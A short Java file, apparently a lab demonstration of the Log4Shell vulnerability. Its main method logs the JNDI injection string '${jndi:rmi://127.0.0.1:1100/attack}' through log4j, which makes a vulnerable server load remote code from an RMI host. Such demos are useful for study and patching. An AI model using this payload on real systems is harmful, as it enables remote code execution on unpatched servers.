package com.dyz.log4j.bug.back.server;

import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

public class BusinessServer {
    private static final Logger log = LogManager.getLogger();
    public static void main(String[] args){
        // 假如这是一条请求内容，你需要把他打印出来。
        String request = "${jndi:rmi://127.0.0.1:1100/attack}";
        log.info("request info： {}",  request);
    }
}
